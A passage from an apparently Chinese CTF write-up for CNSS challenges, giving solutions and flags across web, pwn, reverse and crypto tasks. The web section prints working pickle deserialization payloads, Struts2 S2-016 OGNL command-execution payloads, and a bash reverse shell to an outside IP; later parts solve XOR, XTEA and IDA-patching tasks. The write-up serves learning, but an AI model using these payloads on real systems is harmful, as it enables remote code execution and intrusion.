<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">十六进制编码绕过</span><br><span class="line">(S<span class="string">&#x27;\x52ich&#x27;</span></span><br><span class="line">I2000</span><br><span class="line">i__main__</span><br><span class="line">Hi</span><br><span class="line">.</span><br><span class="line">payload: (S<span class="string">&#x27;\x52ich&#x27;</span>%0aI2000%0ai__main__%0aHi%0a.</span><br><span class="line"></span><br><span class="line">unicode编码绕过</span><br><span class="line">(V\u0052ich</span><br><span class="line">I2000</span><br><span class="line">i__main__</span><br><span class="line">Hi</span><br><span class="line">.</span><br><span class="line">payload: (V\u0052ich%0aI2000%0ai__main__%0aHi%0a.</span><br><span class="line"></span><br><span class="line">或者c操作码从buyInfo全局变量引入进来，有点小复杂的感jio</span><br><span class="line">(i__main__</span><br><span class="line">Hi</span><br><span class="line">(dS<span class="string">&#x27;money&#x27;</span></span><br><span class="line">I2000</span><br><span class="line">sS<span class="string">&#x27;name&#x27;</span></span><br><span class="line">cbuyInfo</span><br><span class="line">NAME</span><br><span class="line">sb.</span><br><span class="line">payload: (i__main__%0aHi%0a(dS<span class="string">&#x27;money&#x27;</span>%0aI2000%<span class="number">0</span>asS<span class="string">&#x27;name&#x27;</span>%0acbuyInfo%0aNAME%<span class="number">0</span>asb.</span><br></pre></td></tr></table></figure>
<p><code>CNSS&#123;fl4g_0nly_f0r_r1ch_k1d5&#125;</code><br>考点<code>pickle反序列化R指令绕过</code></p>
<h2 id="😽-Tomcat-cat"><a href="#😽-Tomcat-cat" class="headerlink" title="😽 Tomcat?cat~"></a>😽 Tomcat?cat~</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python .\Struts2Scan.py -u http://152.136.11.155:10110/user.action</span><br><span class="line"></span><br><span class="line"> ____  _              _       ____    ____</span><br><span class="line">/ ___|| |_ _ __ _   _| |_ ___|___ \  / ___|  ___ __ _ _ __</span><br><span class="line">\___ \| __| <span class="string">&#x27;__| | | | __/ __| __) | \___ \ / __/ _` | &#x27;</span>_ \</span><br><span class="line"> ___) | |_| |  | |_| | |_\__ \/ __/   ___) | (_| (_| | | | |</span><br><span class="line">|____/ \__|_|   \__,_|\__|___/_____| |____/ \___\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">                                      Author By HatBoy</span><br><span class="line"></span><br><span class="line">[+] 正在扫描URL:http://152.136.11.155:10110/user.action</span><br><span class="line">[*] ----------------results------------------</span><br><span class="line">[*] http://152.136.11.155:10110/user.action 存在漏洞: S2-016</span><br></pre></td></tr></table></figure>
<p><code>payload</code>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36241198/article/details/114937777">https://blog.csdn.net/qq_36241198/article/details/114937777</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">任意命令执行 <span class="built_in">env</span> 打印环境变量，存在fake flag</span><br><span class="line">redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.<span class="built_in">set</span>%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.<span class="built_in">exec</span>%28%27env%27%29.getInputStream%28%29%29%7D</span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> / 没有找到flag，不是一般的网站的根目录</span><br><span class="line">redirect%3A%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B%22ls%22%2C%22/usr/local/tomcat/webapps/ROOT%22%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader%20(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.<span class="built_in">read</span>(%23e)%2C%23matt%3D%20%23context.get(<span class="string">&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;</span>)%2C%23matt.getWriter().println%20(%23e)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D</span><br><span class="line"></span><br><span class="line">爆网站根目录 /usr/local/tomcat/webapps/ROOT/ </span><br><span class="line">redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D</span><br><span class="line"></span><br><span class="line">从根目录往上翻，<span class="built_in">cat</span>不动flaaaaaaag，笑嘻了，是个文件夹，/usr/local/tomcat/webapps/flaaaaaaag/flag.jsp</span><br><span class="line">redirect%3A%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B%22cat%22%2C%22/usr/local/tomcat/webapps/flaaaaaaag/flag.jsp%22%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader%20(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.<span class="built_in">read</span>(%23e)%2C%23matt%3D%20%23context.get(<span class="string">&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;</span>)%2C%23matt.getWriter().println%20(%23e)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D </span><br></pre></td></tr></table></figure>
<p><code>CNSS&#123;t0mcat_!s_4_cute_cat_m1a0!&#125;</code><br>话说它的<code>fake flag: FLAG=flag&#123;7r0m_jwt_t0_struts2&#125;</code>，也让我一度怀疑，这里有<code>jwt</code>吗？乱蛊惑人</p>
<p>考点<code>struts2漏洞</code></p>
<h2 id="💽-newsql"><a href="#💽-newsql" class="headerlink" title="💽 newsql()"></a>💽 newsql()</h2><p><code>MySQL8</code>新特性注入，有点事，然后<code>SQL注入</code>又不是很想看，后续无……</p>
<h2 id="🔪-CNSS娘の自助Flag商店"><a href="#🔪-CNSS娘の自助Flag商店" class="headerlink" title="🔪 CNSS娘の自助Flag商店"></a>🔪 CNSS娘の自助Flag商店</h2><p>这次不返回<code>flag</code>了，没有回显，<code>flag is in /flag.txt</code>，考虑反弹<code>shell</code>(可以不装富哥了这次，拿了flag就走)<br>注意编码<code>&amp;</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">(cos</span><br><span class="line">system</span><br><span class="line">S<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line">o.</span><br><span class="line"></span><br><span class="line">payload: (cos%<span class="number">0</span>asystem%0aS%27bash%<span class="number">20</span>-i%<span class="number">20</span>&gt;%<span class="number">26</span>%<span class="number">20</span>/dev/tcp/<span class="number">8.138</span><span class="number">.168</span><span class="number">.65</span>/<span class="number">443</span>%<span class="number">200</span>&gt;%<span class="number">261</span>%<span class="number">27</span>%0ao.</span><br><span class="line"></span><br><span class="line">(S<span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/8.138.168.65/443 0&gt;&amp;1&#x27;</span></span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line">payload: (S%27bash%<span class="number">20</span>-i%<span class="number">20</span>&gt;%<span class="number">26</span>%<span class="number">20</span>/dev/tcp/<span class="number">8.138</span><span class="number">.168</span><span class="number">.65</span>/<span class="number">443</span>%<span class="number">200</span>&gt;%<span class="number">261</span>%<span class="number">27</span>%0aios%<span class="number">0</span>asystem%0a.</span><br></pre></td></tr></table></figure>
<p><code>CNSS&#123;fl4g_f0r_smArt_k1ds&#125;</code><br>考点<code>pickle反序列化反弹shell</code></p>
<h2 id="🐣-没有人比我更懂RuoYi"><a href="#🐣-没有人比我更懂RuoYi" class="headerlink" title="🐣 没有人比我更懂RuoYi()"></a>🐣 没有人比我更懂RuoYi()</h2><p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/2796">https://forum.butian.net/share/2796</a><br>小看了一下，然后有事，后续无……</p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="😯nc-nc"><a href="#😯nc-nc" class="headerlink" title="😯nc? nc!"></a>😯nc? nc!</h2><p>显而易见的<code>pwn</code>签到，<code>ls</code>，<code>cat flag</code></p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="😍-那个女人"><a href="#😍-那个女人" class="headerlink" title="😍 那个女人"></a>😍 那个女人</h2><p><img src="https://picx.zhimg.com/80/v2-06d6c5046f8e882a5e6676370b6242a2_1440w.png" alt=""><br>考点<code>IDA的使用</code></p>
<h2 id="😭我的flag碎了一地"><a href="#😭我的flag碎了一地" class="headerlink" title="😭我的flag碎了一地"></a>😭我的flag碎了一地</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Hint:&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;1. Open in IDA and Learn about `Strings` to find the first part of the flag&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;2. Learn about `Functions` to find the second part of the flag which is the name of a function&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;3. The hint for the last part is in the function you found in the second part&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><code>flag1</code>，<code>shift+F12</code>，查找字符串</p>
<p><code>flag2</code>，<code>Functions</code><br><img src="https://picx.zhimg.com/80/v2-2bf48124e57f02427a7a33ac5722d3ca_1440w.png" alt=""></p>
<p><code>flag3</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Learn about `Xref` and Find out which function refers me to get the last part of the flag!&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><code>views–&gt;Open subsviews–&gt;Function Call</code></p>
<p><img src="https://picx.zhimg.com/80/v2-02ebe7d85228cc2243618ce84837dd42_1440w.png" alt=""></p>
<p><code>CNSS&#123;My_fl@g_h4s_br0ken_4parT_Bu7_Y0u_c@n_f1x_1t!&#125;</code><br>考点(每年必出老题)<code>IDA的基本使用</code></p>
<h2 id="♾️-亦真亦或亦假"><a href="#♾️-亦真亦或亦假" class="headerlink" title="♾️ 亦真亦或亦假"></a>♾️ 亦真亦或亦假</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4[<span class="number">12</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+80h] [rbp+0h]</span></span><br><span class="line">  __int64 v6[<span class="number">12</span>]; <span class="comment">// [rsp+90h] [rbp+10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+F0h] [rbp+70h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+FCh] [rbp+7Ch]</span></span><br><span class="line"></span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  v6[<span class="number">0</span>] = <span class="number">0x731047656E6F7579</span>i64;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="number">0x761B45794B10407D</span>i64;</span><br><span class="line">  v6[<span class="number">2</span>] = <span class="number">0x6E005B71491F585F</span>i64;</span><br><span class="line">  v6[<span class="number">3</span>] = <span class="number">0x45045205575D01</span>i64;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v6[<span class="number">4</span>], <span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input your flag: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v4);</span><br><span class="line">  eNc0d3(v4);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">30</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)v4 + i) != *((_BYTE *)v6 + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Correct!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">eNc0d3</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">26</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="type">unsigned</span> __int8 *)(a1 + i);</span><br><span class="line">    <span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a1) = v3++ ^ *(_BYTE *)(a1 + i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">c = [<span class="number">0x79</span>, <span class="number">0x75</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x65</span>, <span class="number">0x47</span>, <span class="number">0x10</span>, <span class="number">0x73</span>,</span><br><span class="line">     <span class="number">0x7D</span>, <span class="number">0x40</span>, <span class="number">0x10</span>, <span class="number">0x4B</span>, <span class="number">0x79</span>, <span class="number">0x45</span>, <span class="number">0x1B</span>, <span class="number">0x76</span>,</span><br><span class="line">     <span class="number">0x5F</span>, <span class="number">0x58</span>, <span class="number">0x1F</span>, <span class="number">0x49</span>, <span class="number">0x71</span>, <span class="number">0x5B</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>,</span><br><span class="line">     <span class="number">0x01</span>, <span class="number">0x5D</span>, <span class="number">0x57</span>, <span class="number">0x05</span>, <span class="number">0x52</span>, <span class="number">0x04</span>, <span class="number">0x45</span>, <span class="number">0x00</span>]</span><br><span class="line">key = <span class="number">26</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(c[i] ^ (key+i)), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><code>cnss&#123;X0R_c4n_b3_us3d_t0_3nc0d3&#125;</code><br>注意是小端序</p>
<p>考点<code>简单异或</code></p>
<h2 id="🍵-茶杯头大冒险"><a href="#🍵-茶杯头大冒险" class="headerlink" title="🍵 茶杯头大冒险"></a>🍵 茶杯头大冒险</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1, <span class="type">unsigned</span> <span class="type">int</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = *a1;</span><br><span class="line">  v5 = a1[<span class="number">1</span>];</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x1F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 += (((v5 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v5)) + v5) ^ (a2[v4 &amp; <span class="number">3</span>] + v4);</span><br><span class="line">    v4 += <span class="number">289739793</span>;</span><br><span class="line">    v5 += (((v6 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v6)) + v6) ^ (a2[(v4 &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + v4);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v6;</span><br><span class="line">  result = v5;</span><br><span class="line">  a1[<span class="number">1</span>] = v5;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD Str[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5[<span class="number">8</span>]; <span class="comment">// [rsp+40h] [rbp-40h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6[<span class="number">6</span>]; <span class="comment">// [rsp+60h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+7Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  v6[<span class="number">0</span>] = <span class="number">429459223</span>;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="number">537200643</span>;</span><br><span class="line">  v6[<span class="number">2</span>] = <span class="number">537462290</span>;</span><br><span class="line">  v6[<span class="number">3</span>] = <span class="number">537006083</span>;</span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">-999025570</span>;</span><br><span class="line">  v5[<span class="number">1</span>] = <span class="number">970203505</span>;</span><br><span class="line">  v5[<span class="number">2</span>] = <span class="number">-181949973</span>;</span><br><span class="line">  v5[<span class="number">3</span>] = <span class="number">-483739382</span>;</span><br><span class="line">  v5[<span class="number">4</span>] = <span class="number">1062983671</span>;</span><br><span class="line">  v5[<span class="number">5</span>] = <span class="number">-697079924</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input the flag: \n&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)Str) == <span class="number">24</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">      encrypt(&amp;Str[i], v6);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">5</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( Str[j] != v5[j] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it&#x27;s not my teapot!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Oh my god, you made it?!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the length is NSFW~~~&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>XTEA</code><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-266933.htm">https://bbs.kanxue.com/thread-266933.htm</a><br>24位的<code>flag</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">int32_t</span>* v, <span class="type">uint32_t</span>* key)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">	<span class="type">uint32_t</span> delta = <span class="number">289739793</span>;</span><br><span class="line">	<span class="type">uint32_t</span> sum = delta &lt;&lt; <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">		sum -= delta;</span><br><span class="line">		v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	v[<span class="number">0</span>] = v0;</span><br><span class="line">	v[<span class="number">1</span>] = v1;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> key[<span class="number">4</span>];</span><br><span class="line">	key[<span class="number">0</span>] = <span class="number">429459223</span>;</span><br><span class="line">	key[<span class="number">1</span>] = <span class="number">537200643</span>;</span><br><span class="line">	key[<span class="number">2</span>] = <span class="number">537462290</span>;</span><br><span class="line">	key[<span class="number">3</span>] = <span class="number">537006083</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">int32_t</span> enc[<span class="number">12</span>];</span><br><span class="line">	enc[<span class="number">0</span>] = <span class="number">-999025570</span>;</span><br><span class="line">	enc[<span class="number">1</span>] = <span class="number">970203505</span>;</span><br><span class="line">	enc[<span class="number">2</span>] = <span class="number">-181949973</span>;</span><br><span class="line">	enc[<span class="number">3</span>] = <span class="number">-483739382</span>;</span><br><span class="line">	enc[<span class="number">4</span>] = <span class="number">1062983671</span>;</span><br><span class="line">	enc[<span class="number">5</span>] = <span class="number">-697079924</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">4</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">		decrypt(&amp;enc[i], key);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, enc[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (enc[i] &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (enc[i] &amp; <span class="number">0xFF0000</span>) &gt;&gt; <span class="number">16</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (enc[i] &amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\\n&#x27;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>cnss&#123;Enj0y_te4_W!th_me!&#125;</code><br>考点<code>XTEA加密算法</code></p>
<h2 id="✈️-打飞机高手"><a href="#✈️-打飞机高手" class="headerlink" title="✈️ 打飞机高手"></a>✈️ 打飞机高手</h2><p>如果<code>ida</code>有装<code>keypatch</code>这个插件的话就能直接通过更改汇编语句从而<code>patch</code>机器码<br><a target="_blank" rel="noopener" href="https://github.com/keystone-engine/keypatch">https://github.com/keystone-engine/keypatch</a><br>下载<code>Keypatch.py</code>复制到插件目录<code>IDA 7.0\plugins\Keypatch.py</code><br>下载安装<code>keystone python</code>模块，64位系统只需要安装这一个就行<br><a target="_blank" rel="noopener" href="https://github.com/keystone-engine/keystone/releases/download/0.9.1/keystone-0.9.1-python-win64.msi">https://github.com/keystone-engine/keystone/releases/download/0.9.1/keystone-0.9.1-python-win64.msi</a><br>(IDA打开一个文件之后，Edit没看见Patch，即没成功)如果不行(可能需要)继续安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install keystone-engine <span class="comment"># 安装</span></span><br><span class="line">pip install keystone-engine --upgrade <span class="comment"># 已有，则升级</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic1.zhimg.com/80/v2-d6b21a295490beaebf6b0b22aca2c94b_1440w.png" alt=""><br>修改汇编语句的分数为<code>01h</code>，这个0是必须的十六进制是这样的，一路点击<code>patch</code>，最后那个不知道什么取消掉就好(不造啊)<br>然后，<code>Patch program</code>&gt;<code>apply patches to input file</code><br>重新打一次飞机即可(bushi，空格是射击)<br>好像会<code>patch</code>了()</p>
<p><code>cnss&#123;w0w_y0u_4r3_7he_m4st3r_0f_h1tt1ng_p1an3s!&#125;</code><br>考点<code>patch 汇编语句修改</code></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="🔮-cnss娘的谜语"><a href="#🔮-cnss娘的谜语" class="headerlink" title="🔮 cnss娘的谜语"></a>🔮 cnss娘的谜语</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">import base64</span></span><br><span class="line"><span class="string"># secret is a local file, flag is unknown to you. Try to find it.</span></span><br><span class="line"><span class="string">from secret import flag</span></span><br><span class="line"><span class="string">assert type(flag) == str</span></span><br><span class="line"><span class="string">flag = flag.encode()</span></span><br><span class="line"><span class="string">length = len(flag)</span></span><br><span class="line"><span class="string">assert length % 4 == 0</span></span><br><span class="line"><span class="string">L = length // 4</span></span><br><span class="line"><span class="string">secret1 = bytes_to_long(flag[:L])</span></span><br><span class="line"><span class="string">secret2 = flag[L:2*L].hex()</span></span><br><span class="line"><span class="string">secret3 = bin(int(flag[2*L:3*L].hex(), 16))</span></span><br><span class="line"><span class="string">secret4 = base64.b64encode(flag[3*L:])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">secret1 = 30772543014919602267414633191</span></span><br><span class="line"><span class="string">secret2 = &#x27;bc96e7a081e698afe5ada620&#x27;</span></span><br><span class="line"><span class="string">secret3 = &#x27;0b10000110111001001111001011100000111010001101111001000001110011110011010100001001110011110101100&#x27;</span></span><br><span class="line"><span class="string">secret4 = b&#x27;rOS4gOatpeOAgiF9&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">secret1 = <span class="number">30772543014919602267414633191</span></span><br><span class="line">secret2 = <span class="string">&#x27;bc96e7a081e698afe5ada620&#x27;</span></span><br><span class="line">secret3 = <span class="string">&#x27;0b10000110111001001111001011100000111010001101111001000001110011110011010100001001110011110101100&#x27;</span></span><br><span class="line">secret4 = <span class="string">b&#x27;rOS4gOatpeOAgiF9&#x27;</span></span><br><span class="line">flag1 = long_to_bytes(secret1)</span><br><span class="line">flag2 = long_to_bytes(<span class="built_in">int</span>(secret2, <span class="number">16</span>))</span><br><span class="line">flag3 = long_to_bytes(<span class="built_in">int</span>(secret3[<span class="number">2</span>:], <span class="number">2</span>))</span><br><span class="line">flag4 = base64.b64decode(secret4)</span><br><span class="line"><span class="built_in">print</span>((flag1+flag2+flag3+flag4).decode())</span><br></pre></td></tr></table></figure>
<p><code>cnss&#123;学会编码是学 Crypto 的第一步。!&#125;</code><br>考点<code>基本的字符串</code></p>
